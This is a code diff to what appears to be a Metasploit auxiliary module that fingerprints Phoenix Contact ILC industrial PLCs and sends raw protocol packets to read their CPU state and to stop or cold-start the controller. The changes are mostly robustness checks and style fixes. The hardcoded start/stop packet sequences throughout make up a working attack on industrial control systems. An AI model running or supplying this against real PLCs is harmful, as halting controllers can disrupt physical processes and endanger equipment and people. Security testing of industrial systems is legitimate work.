@@ -6,7 +6,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Rex::Socket::Tcp
 
@@ -71,11 +70,21 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_info(rhost, rport)
-    connect(true, {'RHOST'=>rhost, 'RPORT'=>rport})
-    code = send_recv_once("\x01\x01\x00\x1a\x00^\x00\x00\x00\x00\x00\x03\x00\x0cIBETH01N0_M\x00")[34..35]
+    connect(true, 'RHOST' => rhost, 'RPORT' => rport)
+    data = send_recv_once("\x01\x01\x00\x1a\x00^\x00\x00\x00\x00\x00\x03\x00\x0cIBETH01N0_M\x00")
+    if data.nil? || data.length < 36
+      print_error("Could not obtain information on this device")
+      disconnect
+      return "UNKNOWN"
+    end
+    code = data[34..35]
     send_recv_once("\x01\x05\x00\x16\x00\x5f\x00\x00\x08\xef\x00" + hex_to_bin(code) + "\x00\x00\x00\x22\x00\x04\x02\x95\x00\x00")
     data = send_recv_once("\x01\x06\x00\x0e\x00\x61\x00\x00\x88\x11\x00" + hex_to_bin(code) + "\x04\x00")
     disconnect
+    if data.nil? || data.length < 200
+      print_error("Could not obtain information on this device")
+      return "UNKNOWN"
+    end
     plctype = hex_to_bin(data[60..99])
     print_status("PLC Type = " + plctype)
     print_status("Firmware = " + hex_to_bin(data[132..139]))
@@ -119,17 +128,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_state1(data)
-   if data[48..49] == '03'
-     state = 'RUN'
-   elsif data[48..49] == '07'
-     state = 'STOP'
-   elsif data[49..49] == '00'
-     state = 'ON'
-   else
-     print_error('CPU State not detected, full result is ' + data)
-     return
-   end
-   state
+    if data[48..49] == '03'
+      state = 'RUN'
+    elsif data[48..49] == '07'
+      state = 'STOP'
+    elsif data[49..49] == '00'
+      state = 'ON'
+    else
+      print_error('CPU State not detected, full result is ' + data)
+      return
+    end
+    state
   end
 
   def get_state2(data)
@@ -145,7 +154,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_cpu(rhost, rport, devicetype)
-    connect(true, {'RHOST'=>rhost, 'RPORT'=>rport})
+    connect(true, 'RHOST' => rhost, 'RPORT' => rport)
     state = 'unknown'
     if devicetype == '15x'
       init_phase1
@@ -165,11 +174,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def set_cpu(rhost, rport, action, state, devicetype)
-    connect(true, {'RHOST'=>rhost, 'RPORT'=>rport})
+    connect(true, 'RHOST' => rhost, 'RPORT' => rport)
     if devicetype == '15x'
       init_phase1 ## Several packets (21)
       send_recv_once("\x01\x00\x02\x00\x00\x00\x1c\x00\x03\x00\x03\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x07\x00\x05\x00\x06\x00\x08\x00\x10\x00\x02\x00\x11\x00\x0e\x00\x0f\x00\r\x00\x16@\x16\x00")
-      if action == 'START' or (action == 'REV' and state == 'STOP')
+      if action == 'START' || (action == 'REV' && state == 'STOP')
         print_status('--> Sending COLD start now')
         send_recv_once("\x01\x00\x02\x00\x00\x00\x02\x00\x01\x00\x06\x00\x00\x00\x00\x00\x01\x00")
       else
@@ -178,7 +187,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     elsif devicetype == '39x'
       init_phase2 ## Several packets (6)
-      if action == 'START' or (action == 'REV' and state == 'STOP')
+      if action == 'START' || (action == 'REV' && state == 'STOP')
         print_status('--> Sending COLD start now')
         send_recv_once("\xcc\x01\x00\x04\x40\x0e\x00\x00\x18\x21")
       else
@@ -201,10 +210,10 @@ class MetasploitModule < Msf::Auxiliary
 
     device = get_info(rhost, datastore['RINFOPORT'])
 
-    if device.start_with?('ILC 15') or device.start_with?('ILC 17')
+    if device.start_with?('ILC 15', 'ILC 17')
       devicetype = '15x'
       print_status('--> Detected 15x/17x series, getting current CPU state:')
-      ractionport == 0  ? (rport = 41100) : (rport = ractionport)
+      ractionport == 0 ? (rport = 41100) : (rport = ractionport)
     elsif device.start_with?('ILC 39')
       devicetype = '39x'
       print_status('--> Detected 39x series, getting current CPU state:')
@@ -218,11 +227,10 @@ class MetasploitModule < Msf::Auxiliary
     print_status('------------------------------------')
 
     if action == "NOOP"
-      print_status('--> No action specified (' + action  + '), stopping here')
+      print_status("--> No action specified (#{action}), stopping here")
       return
     end
 
     set_cpu(rhost, rport, action, state, devicetype)
   end
 end
-
